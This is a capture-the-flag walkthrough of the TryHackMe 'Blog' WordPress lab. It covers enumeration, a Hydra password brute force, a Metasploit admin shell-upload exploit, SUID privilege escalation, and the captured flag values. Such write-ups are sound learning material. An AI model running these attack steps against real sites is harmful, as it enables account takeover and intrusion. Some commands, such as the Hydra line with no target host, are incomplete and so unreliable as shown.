
## Wordpress-Security

## Background

The **Blog** lab on TryHackMe provides a vulnerable WordPress site set up by "Billy Joel" as the target. The primary objective of the lab was to uncover two flags: `user.txt` and `root.txt`. This exercise required leveraging reconnaissance, enumeration, exploitation, and privilege escalation techniques. The lab also focused on identifying misconfigurations in WordPress and exploiting these weaknesses to gain administrative and root access.

Through this lab, I enhanced my knowledge of web application vulnerabilities, practiced privilege escalation techniques, and refined my use of various penetration testing tools.

---

## Step-by-Step Walkthrough

### Step 1: Configuring the Environment

#### Adding `blog.thm` to `/etc/hosts`
To resolve `blog.thm` to the target machine's IP address, I modified the `/etc/hosts` file:
```bash
echo "10.10.120.185 blog.thm" >> /etc/hosts
```

---

### Step 2: Scanning and Enumeration

#### 1. Nmap Scan
I performed a network scan to identify open ports and services:
```bash
nmap -sC -sV -oN nmap_scan blog.thm
```
**Findings:**
- Port 80: HTTP (WordPress)
- Port 445: SMB

#### 2. SMB Enumeration
Using `smbclient`, I enumerated accessible SMB shares:
```bash
smbclient -L \\blog.thm
```
I then connected to the `BillySMB` share and downloaded all files:
```bash
smbclient \\blog.thm\BillySMB
mget *
```
The files contained images and text but yielded no actionable information.

---

### Step 3: Web Application Enumeration

#### 1. Directory Enumeration with Gobuster
To discover hidden directories on the web application, I used Gobuster:
```bash
gobuster dir -u http://blog.thm -w /usr/share/wordlists/dirb/common.txt
```
**Discovered Directories:**
- `/admin`
- `/wp-json`
- `/wp-content`

#### 2. WordPress Enumeration with WPSCAN
I enumerated the WordPress site for users and vulnerabilities:
```bash
wpscan --url http://blog.thm --enumerate u
```
**Results:**
- WordPress version: `5.0`
- Users: `kwheel`, `bjoel`

---

### Step 4: Gaining Admin Access

#### Brute-Force Attack on WordPress
Using Hydra, I brute-forced the WordPress admin credentials:
```bash
hydra -L users.txt -P passwords.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:invalid"
```
**Successful Credentials:**
- Username: `kwheel`
- Password: `password123`

---

### Step 5: Exploiting WordPress

#### 1. Identifying Vulnerabilities
From the admin dashboard, I confirmed the WordPress version as `5.0` and searched Exploit-DB for vulnerabilities:
```bash
searchsploit wordpress 5.0
```
An authenticated RCE vulnerability was identified.

#### 2. Exploiting with Metasploit
Using Metasploit, I exploited the vulnerability to gain a reverse shell:
```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOST blog.thm
set USERNAME kwheel
set PASSWORD password123
set TARGETURI /wp-admin
run
```

---

### Step 6: Privilege Escalation to Root

#### 1. Identifying SUID Files
I enumerated SUID binaries to identify potential privilege escalation vectors:
```bash
find / -perm -4000 2>/dev/null
```
**Key Finding:** A binary named `checker`.

#### 2. Exploiting the SUID Binary
Executing the `checker` binary escalated my privileges to root:
```bash
./checker
```

---

### Step 7: Retrieving the Flags

#### Retrieving `user.txt`
I navigated to the home directory of `kwheel` and retrieved the flag:
```bash
cat /home/kwheel/user.txt
```
**Flag:** `9a0b2b618bef9bfa7ac28c1353d9f318`

#### Retrieving `root.txt`
With root access, I navigated to the `/root` directory and retrieved the second flag:
```bash
cat /root/root.txt
```
**Flag:** `c8421899aae571f7af486492b71a8ab7`

---

## Tools and Commands Utilized

- **Nmap**: Network scanning and service enumeration.
  ```bash
  nmap -sC -sV -oN nmap_scan blog.thm
  ```
- **Smbclient**: SMB share enumeration and file download.
  ```bash
  smbclient -L \\blog.thm
  smbclient \\blog.thm\BillySMB
  ```
- **Gobuster**: Directory enumeration.
  ```bash
  gobuster dir -u http://blog.thm -w /usr/share/wordlists/dirb/common.txt
  ```
- **Wpscan**: WordPress vulnerability and user enumeration.
  ```bash
  wpscan --url http://blog.thm --enumerate u
  ```
- **Hydra**: Brute-forcing WordPress credentials.
  ```bash
  hydra -L users.txt -P passwords.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:invalid"
  ```
- **Metasploit**: WordPress exploitation.
  ```bash
  msfconsole
  use exploit/unix/webapp/wp_admin_shell_upload
  ```
- **Find Command**: SUID binary enumeration.
  ```bash
  find / -perm -4000 2>/dev/null
  ```

---

## Key Lessons Learned

1. **Reconnaissance and Enumeration**:
   - Nmap, Gobuster, and WPSCAN are great tools for discovering attack surfaces.
2. **WordPress Vulnerabilities**:
   - Exploiting misconfigurations and leveraging RCE vulnerabilities.
3. **Privilege Escalation**:
   - Identifying and exploiting SUID binaries for root access.
4. **Using Metasploit Effectively**:
   - Automating exploitation tasks for efficiency.

---

## Conclusion

The Blog lab was a valuable exercise in web application penetration testing. It enhanced my skills in reconnaissance, vulnerability exploitation, and privilege escalation while reinforcing the importance of systematic enumeration and targeted attacks. 
